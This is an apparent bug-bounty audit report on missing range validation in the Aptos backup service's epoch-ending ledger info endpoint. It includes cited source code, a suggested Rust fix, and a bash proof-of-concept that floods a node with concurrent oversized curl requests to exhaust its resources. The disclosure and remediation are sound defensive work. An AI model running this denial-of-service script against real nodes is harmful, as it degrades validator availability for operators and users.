# Audit Report

## Title
Backup Service Epoch Range DoS: Missing Validation Allows Resource Exhaustion

## Summary
The `BackupHandler::get_epoch_ending_ledger_info_iter()` function lacks input validation and range limits that exist in other code paths, allowing an attacker to request arbitrarily large epoch ranges via the backup service HTTP API. This causes excessive database iteration, CPU usage, memory consumption, and network bandwidth exhaustion, leading to node slowdowns or API crashes.

## Finding Description

The Aptos storage layer provides two distinct paths for retrieving epoch-ending ledger infos:

**Protected Path (DbReader trait):** [1](#0-0) 

This implementation includes critical safeguards:
1. Validates that `start_epoch <= end_epoch` [2](#0-1) 

2. Validates that `end_epoch` doesn't exceed the latest epoch in the database [3](#0-2) 

3. Limits the maximum range to `MAX_NUM_EPOCH_ENDING_LEDGER_INFO` (100 epochs) [4](#0-3) 

**Unprotected Path (BackupHandler):** [5](#0-4) 

This implementation **bypasses all validation** and directly calls the underlying database method without any checks or limits.

The vulnerability is exposed through the backup service HTTP endpoint: [6](#0-5) 

**Attack Scenario:**

1. Attacker sends HTTP request: `GET /epoch_ending_ledger_infos/0/18446744073709551615`
2. The handler extracts `start_epoch=0` and `end_epoch=u64::MAX` from URL parameters without validation
3. `BackupHandler::get_epoch_ending_ledger_info_iter()` creates an iterator with these values
4. The iterator processes ALL epochs currently in the database (potentially thousands for long-running networks)
5. For each epoch, the system:
   - Performs database reads
   - Deserializes LedgerInfoWithSignatures structures
   - Serializes them to BCS bytes
   - Transmits them over HTTP
6. The handler thread remains blocked for the entire duration
7. Multiple concurrent malicious requests exhaust all handler threads

The underlying iterator implementation stops when the database runs out of epochs, but for a production network with thousands of epochs, this still represents significant resource consumption: [7](#0-6) 

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:

- **Validator node slowdowns**: Processing thousands of epochs consumes significant CPU (deserialization/serialization), memory (buffering), disk I/O (database reads), and network bandwidth, causing node performance degradation
- **API crashes**: Handler threads remain blocked for extended periods; concurrent malicious requests can exhaust the thread pool, causing API unresponsiveness or crashes
- **Availability impact**: Validators or fullnodes running the backup service become vulnerable to resource exhaustion attacks

The impact is bounded by the actual number of epochs in the database (not truly infinite), but for production networks operating for months or years, this could easily be 10,000+ epochs, each requiring substantial processing.

## Likelihood Explanation

**High Likelihood:**

1. **Simple Exploitation**: Requires only a single HTTP GET request with crafted parameters
2. **No Authentication**: The backup service endpoint lacks per-request authentication or rate limiting beyond network-level controls
3. **Default Deployment**: The backup service listens on `0.0.0.0:6186` by default in fullnode configurations
4. **Legitimate Appearance**: The attack traffic appears as legitimate backup requests, making it difficult to distinguish from normal operations
5. **Amplification Factor**: A single small HTTP request triggers processing of potentially thousands of database entries

## Recommendation

Add the same validation and limits present in the DbReader implementation to the BackupHandler:

```rust
pub fn get_epoch_ending_ledger_info_iter(
    &self,
    start_epoch: u64,
    end_epoch: u64,
) -> Result<impl Iterator<Item = Result<LedgerInfoWithSignatures>> + '_> {
    // Add validation
    ensure!(
        start_epoch <= end_epoch,
        "Bad epoch range [{}, {})",
        start_epoch,
        end_epoch,
    );
    
    // Get latest epoch to validate request
    let latest_epoch = self
        .ledger_db
        .metadata_db()
        .get_latest_ledger_info()?
        .ledger_info()
        .next_block_epoch();
    
    ensure!(
        end_epoch <= latest_epoch,
        "Unable to provide epoch change ledger info for still open epoch. asked upper bound: {}, last sealed epoch: {}",
        end_epoch,
        latest_epoch,
    );
    
    // Limit the range
    let limit = std::cmp::min(
        end_epoch.saturating_sub(start_epoch),
        MAX_NUM_EPOCH_ENDING_LEDGER_INFO as u64,
    );
    let end_epoch = start_epoch.saturating_add(limit);
    
    Ok(self
        .ledger_db
        .metadata_db()
        .get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
        .enumerate()
        .map(move |(idx, li)| {
            BACKUP_EPOCH_ENDING_EPOCH.set((start_epoch + idx as u64) as i64);
            li
        }))
}
```

Additionally, consider implementing endpoint-level rate limiting or pagination for the backup service API to prevent abuse.

## Proof of Concept

```bash
#!/bin/bash
# Exploit script - sends malicious request to backup service

BACKUP_SERVICE_URL="http://target-node:6186"

# Request all epochs from 0 to u64::MAX
# This will cause the node to iterate through all existing epochs
curl -v "${BACKUP_SERVICE_URL}/epoch_ending_ledger_infos/0/18446744073709551615"

# Send multiple concurrent requests to exhaust handler threads
for i in {1..10}; do
    curl "${BACKUP_SERVICE_URL}/epoch_ending_ledger_infos/0/18446744073709551615" &
done

wait
echo "DoS attack complete - target node should show resource exhaustion"
```

**Expected Impact:**
- Target node's backup service becomes unresponsive
- CPU usage spikes due to database reads and serialization
- Memory consumption increases from buffering large responses
- Network bandwidth saturated transmitting epoch data
- Handler threads blocked for extended periods
- Legitimate backup operations fail or timeout

## Notes

This vulnerability exists because the `BackupHandler` was designed as a lower-level API for internal backup operations but was exposed via HTTP without inheriting the protection mechanisms implemented in the higher-level `DbReader` trait. The inconsistency between these two code paths created an exploitable gap in input validation.

### Citations

**File:** storage/aptosdb/src/db/aptosdb_reader.rs (L572-595)
```rust
    fn get_epoch_ending_ledger_info_iterator(
        &self,
        start_epoch: u64,
        end_epoch: u64,
    ) -> Result<Box<dyn Iterator<Item = Result<LedgerInfoWithSignatures>> + '_>> {
        gauged_api("get_epoch_ending_ledger_info_iterator", || {
            self.check_epoch_ending_ledger_infos_request(start_epoch, end_epoch)?;
            let limit = std::cmp::min(
                end_epoch.saturating_sub(start_epoch),
                MAX_NUM_EPOCH_ENDING_LEDGER_INFO as u64,
            );
            let end_epoch = start_epoch.saturating_add(limit);

            let iter = self
                .ledger_db
                .metadata_db()
                .get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?;

            Ok(Box::new(iter)
                as Box<
                    dyn Iterator<Item = Result<LedgerInfoWithSignatures>> + '_,
                >)
        })
    }
```

**File:** storage/aptosdb/src/db/aptosdb_reader.rs (L1007-1017)
```rust
    fn check_epoch_ending_ledger_infos_request(
        &self,
        start_epoch: u64,
        end_epoch: u64,
    ) -> Result<()> {
        ensure!(
            start_epoch <= end_epoch,
            "Bad epoch range [{}, {})",
            start_epoch,
            end_epoch,
        );
```

**File:** storage/aptosdb/src/db/aptosdb_reader.rs (L1021-1030)
```rust
        let latest_epoch = self
            .ledger_db
            .metadata_db()
            .get_latest_ledger_info()?
            .ledger_info()
            .next_block_epoch();
        ensure!(
            end_epoch <= latest_epoch,
            "Unable to provide epoch change ledger info for still open epoch. asked upper bound: {}, last sealed epoch: {}",
            end_epoch,
```

**File:** storage/aptosdb/src/common.rs (L9-9)
```rust
pub(crate) const MAX_NUM_EPOCH_ENDING_LEDGER_INFO: usize = 100;
```

**File:** storage/aptosdb/src/backup/backup_handler.rs (L207-221)
```rust
    pub fn get_epoch_ending_ledger_info_iter(
        &self,
        start_epoch: u64,
        end_epoch: u64,
    ) -> Result<impl Iterator<Item = Result<LedgerInfoWithSignatures>> + '_> {
        Ok(self
            .ledger_db
            .metadata_db()
            .get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
            .enumerate()
            .map(move |(idx, li)| {
                BACKUP_EPOCH_ENDING_EPOCH.set((start_epoch + idx as u64) as i64);
                li
            }))
    }
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L90-99)
```rust
    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** storage/aptosdb/src/utils/iterators.rs (L209-233)
```rust
    fn next_impl(&mut self) -> Result<Option<LedgerInfoWithSignatures>> {
        if self.next_epoch >= self.end_epoch {
            return Ok(None);
        }

        let ret = match self.inner.next().transpose()? {
            Some((epoch, li)) => {
                if !li.ledger_info().ends_epoch() {
                    None
                } else {
                    ensure!(
                        epoch == self.next_epoch,
                        "Epochs are not consecutive. expecting: {}, got: {}",
                        self.next_epoch,
                        epoch,
                    );
                    self.next_epoch += 1;
                    Some(li)
                }
            },
            _ => None,
        };

        Ok(ret)
    }
```
